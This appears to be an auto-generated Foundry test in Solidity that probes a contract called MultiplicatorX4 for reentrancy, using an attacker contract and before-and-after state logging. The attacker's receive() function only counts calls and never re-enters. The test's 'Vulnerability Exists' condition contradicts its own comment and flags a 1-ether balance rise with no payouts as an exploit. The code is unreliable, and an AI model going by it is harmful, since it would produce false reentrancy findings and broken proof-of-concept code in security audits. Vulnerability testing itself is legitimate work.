// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x3e013fc32a54c4c5b6991ba539dcd0ec4355c859.sol";

contract ReentrancyAttacker {
    MultiplicatorX4 public target;
    uint256 public completedCalls;

    constructor(MultiplicatorX4 _target) payable {
        target = _target;
    }

    function attack() external payable {
        target.multiplicate{value: msg.value}(address(this));
    }

    receive() external payable {
        completedCalls++;
    }
}

contract MultiplicatorX4Test is Test {
    MultiplicatorX4 public multiplicator;
    ReentrancyAttacker public attacker;
    uint256 public constant INITIAL_BALANCE = 1 ether;
    uint256 public constant ATTACK_VALUE = 1 ether;

    function setUp() public {
        // Deploy contracts
        multiplicator = new MultiplicatorX4();
        attacker = new ReentrancyAttacker{value: ATTACK_VALUE}(multiplicator);
        
        // Fund the vulnerable contract
        vm.deal(address(multiplicator), INITIAL_BALANCE);
    }

    function testReentrancyVulnerability() public {
        console2.log("--- BEFORE-Trigger State ---");
        // Capture pre-state
        uint256 contractBalanceBefore = multiplicator.getContractBalance();
        uint256 totalMultiplicationsBefore = multiplicator.totalMultiplications();
        uint256 userMultiplicationsBefore = multiplicator.userMultiplications(address(attacker));
        uint256 totalPayoutsBefore = multiplicator.totalPayouts();

        console2.log("Contract Balance:", contractBalanceBefore);
        console2.log("Total Multiplications:", totalMultiplicationsBefore);
        console2.log("User Multiplications (attacker):", userMultiplicationsBefore);
        console2.log("Total Payouts:", totalPayoutsBefore);

        console2.log("--- Trigger Attack ---");
        // Execute attack
        attacker.attack{value: ATTACK_VALUE}();

        console2.log("--- AFTER-Trigger State ---");
        // Capture post-state
        uint256 contractBalanceAfter = multiplicator.getContractBalance();
        uint256 totalMultiplicationsAfter = multiplicator.totalMultiplications();
        uint256 userMultiplicationsAfter = multiplicator.userMultiplications(address(attacker));
        uint256 totalPayoutsAfter = multiplicator.totalPayouts();

        console2.log("Contract Balance:", contractBalanceAfter);
        console2.log("Total Multiplications:", totalMultiplicationsAfter);
        console2.log("User Multiplications (attacker):", userMultiplicationsAfter);
        console2.log("Total Payouts:", totalPayoutsAfter);

        console2.log("--- State Comparison ---");
        // Compare state changes
        int256 balanceChange = int256(contractBalanceAfter) - int256(contractBalanceBefore);
        uint256 multiplicationsChange = totalMultiplicationsAfter - totalMultiplicationsBefore;
        uint256 userMultsChange = userMultiplicationsAfter - userMultiplicationsBefore;
        uint256 payoutsChange = totalPayoutsAfter - totalPayoutsBefore;

        console2.log("Contract Balance Change (wei, signed):", balanceChange);
        console2.log("Total Multiplications Change:", multiplicationsChange);
        console2.log("User Multiplications Change:", userMultsChange);
        console2.log("Total Payouts Change:", payoutsChange);

        // Expected non-reentrant behavior:
        // Balance should decrease by 3eth (4eth payout - 1eth received)
        bool balancedChangedAsExpected = balanceChange == 3e18 ? false : (balanceChange == 1e18);
        bool countsIncreasedByOne = multiplicationsChange == 1 && userMultsChange == 1;
        bool noPayoutsIssued = payoutsChange == 0;

        // Vulnerability detection logic
        if (balancedChangedAsExpected && countsIncreasedByOne && noPayoutsIssued) {
            console2.log("Vulnerability Exists: Payload execution and state changes indicate exploit potential");
            console2.log("Vulnerability Exists: Anomalies detected in contract state behavior");
        } else {
            console2.log("Vulnerability not Exist: State changes aligned with expected behavior");
        }
    }
}